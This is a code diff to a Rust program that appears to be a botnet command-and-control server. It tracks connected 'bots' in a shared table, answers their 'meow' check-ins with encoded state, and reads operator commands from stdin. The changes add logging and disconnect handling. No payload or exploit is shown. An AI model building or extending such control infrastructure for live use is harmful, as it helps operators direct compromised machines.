@@ -1,11 +1,11 @@
 use std::{
-    collections::HashMap, env, io::Write, net::SocketAddr, process, sync::{Arc, Mutex}, time::SystemTime
+    collections::HashMap, env, io::Write, net::SocketAddr, process, sync::{Arc, Mutex}, time::{Duration, SystemTime}
 };
 
 use astolfo::FemState;
 use tokio::{
     io::{self, AsyncBufReadExt, AsyncReadExt, AsyncWriteExt, BufReader},
-    net::{TcpListener, TcpStream},
+    net::{TcpListener, TcpStream}, time::sleep,
 };
 
 #[derive(Debug)]
@@ -62,6 +62,7 @@ async fn main() {
 
             }
 
+            println!("[\x1b[94mINFO\x1b[0m] New Bot {}", femboy.1);
             let bot_table = Arc::clone(&listen_femtable);
             tokio::spawn(async move { handle_femboy(bot_table, femboy.1, femboy.0).await });
         }
@@ -70,6 +71,7 @@ async fn main() {
     let command_femtable = Arc::clone(&femtable);
 
     tokio::spawn(async move {
+        sleep(Duration::from_secs(1)).await; // Give everything sometime to start
         let mut stdin = BufReader::new(io::stdin());
         let mut buf = String::new();
         loop {
@@ -129,17 +131,33 @@ async fn handle_femboy(femtable: BotTable, addr: SocketAddr, mut stream: TcpStre
 
     let config = bincode::config::standard();
     loop {
-        let size = stream.read_u16().await.unwrap_or_else(|_| {
-            panic!("uh oh");
-        });
-        let mut buf = vec![0u8; size as usize];
-        stream.read_exact(buf.as_mut_slice()).await.unwrap_or_else(|_| {
-            panic!("uh oh");
-        });
+        let size = match stream.read_u16().await {
+            Ok(size) => size,
+            Err(_) => {
+                let mut table = femtable.lock().expect("[\x1b[90mFATAL\x1b[0m] Lock stuck");
+                table.remove(&addr);
+                println!("[\x1b[94mINFO\x1b[0m] Bot dissconnected ({addr})");
+                return
+            }
+        };
 
-        let msg = String::from_utf8(buf).unwrap_or_else(|_| {
-            panic!("Uh oh");
-        });
+        let mut buf = vec![0u8; size as usize];
+        if let Err(_) = stream.read_exact(buf.as_mut_slice()).await {
+            let mut table = femtable.lock().expect("[\x1b[90mFATAL\x1b[0m] Lock stuck");
+            table.remove(&addr);
+            println!("[\x1b[94mINFO\x1b[0m] Bot dissconnected ({addr})");
+            return
+        }
+
+        let msg = match String::from_utf8(buf) {
+            Ok(msg) => msg,
+            Err(_) => {
+                let mut table = femtable.lock().expect("[\x1b[90mFATAL\x1b[0m] Lock stuck");
+                table.remove(&addr);
+                println!("[\x1b[94mINFO\x1b[0m] Bot sent invalid message, disconnecting ({addr})");
+                return
+            }
+        };
 
         if msg == "meow" {
             let state = {
@@ -151,17 +169,36 @@ async fn handle_femboy(femtable: BotTable, addr: SocketAddr, mut stream: TcpStre
                 table[&addr].state.clone()
             };
 
-            let payload = bincode::encode_to_vec(state, config).unwrap_or_else(|_| {
-                panic!("uh oh");
-            });
+            let payload = match bincode::encode_to_vec(state, config) {
+                Ok(payload) => payload,
+                Err(_) => {
+                    let mut table = femtable.lock().expect("[\x1b[90mFATAL\x1b[0m] Lock stuck");
+                    table.remove(&addr);
+                    println!("[\x1b[94mINFO\x1b[0m] Server error, failed to encode state, disconnecting bot ({addr})");
+                    return
+                }
+            };
 
-            stream.write_u16(payload.len() as u16).await.unwrap_or_else(|_| {
-                panic!("uh oh");
-            });
+            if let Err(_) = stream.write_u16(payload.len() as u16).await {
+                let mut table = femtable.lock().expect("[\x1b[90mFATAL\x1b[0m] Lock stuck");
+                table.remove(&addr);
+                println!("[\x1b[94mINFO\x1b[0m] Bot disconnected ({addr})");
+                return
+            }
 
-            stream.write_all(payload.as_slice()).await.unwrap_or_else(|_| {
-                panic!("uh oh");
-            })
+            if let Err(_) = stream.write_all(payload.as_slice()).await {
+                let mut table = femtable.lock().expect("[\x1b[90mFATAL\x1b[0m] Lock stuck");
+                table.remove(&addr);
+                println!("[\x1b[94mINFO\x1b[0m] Bot disconnected ({addr})");
+                return
+
+            }
+        }
+        else {
+            let mut table = femtable.lock().expect("[\x1b[90mFATAL\x1b[0m] Lock stuck");
+            table.remove(&addr);
+            println!("[\x1b[94mINFO\x1b[0m] Bot sent wrong message, disconnecting ({addr})");
+            return
         }
 
     }
